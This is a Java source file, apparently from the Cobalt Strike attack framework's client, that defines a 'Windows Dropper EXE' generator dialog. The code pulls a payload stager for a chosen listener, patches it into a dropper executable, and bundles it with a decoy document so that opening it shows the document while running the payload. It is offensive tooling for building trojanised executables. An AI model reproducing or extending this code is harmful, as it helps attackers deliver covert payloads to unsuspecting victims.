package aggressor.dialogs;

import aggressor.AggressorClient;
import common.ArtifactUtils;
import common.ListenerUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;

import java.awt.event.ActionEvent;
import java.io.File;
import java.io.IOException;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class WindowsDropperDialog implements DialogListener, SafeDialogCallback {

    protected JFrame dialog = null;

    protected Map options = null;

    protected AggressorClient client = null;

    protected String file;

    protected String name;

    protected String listener;

    public WindowsDropperDialog(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        this.file = map.get("file") + "";
        this.name = map.get("name") + "";
        this.listener = map.get("listener") + "";
        File file1 = new File(this.file);
        if (!file1.exists() || this.file.length() == 0) {
            DialogUtils.showError("I need a file to embed to make a dropper");
            return;
        }
        if ("".equals(map.get("name")))
            this.name = file1.getName();
        SafeDialogs.saveFile(null, "dropper.exe", this);
    }

    public void dialogResult(String string) {
        byte[] arrby1 = ListenerUtils.getListener(this.client, this.listener).getPayloadStager("x86");
        byte[] arrby2 = (new ArtifactUtils(this.client)).patchArtifact(arrby1, "dropper32.exe");
        (new ArtifactUtils(this.client)).setupDropper(arrby2, this.file, this.name, string);
        DialogUtils.showInfo("Saved Windows Dropper EXE to\n" + string);
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog("Windows Dropper EXE", 640, 480);
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        dialogManager.sc_listener_stagers("listener", "Listener:", this.client);
        dialogManager.file("file", "Embedded File:");
        dialogManager.text("name", "File Name:");
        JButton jButton1 = dialogManager.action("Generate");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-windows-dropper");
        this.dialog.add(DialogUtils.description("This package creates a Windows document dropper. This package drops a document to disk, opens it, and executes a payload."), "North");
        this.dialog.add(dialogManager.layout(), "Center");
        this.dialog.add(DialogUtils.center(jButton1, jButton2), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}
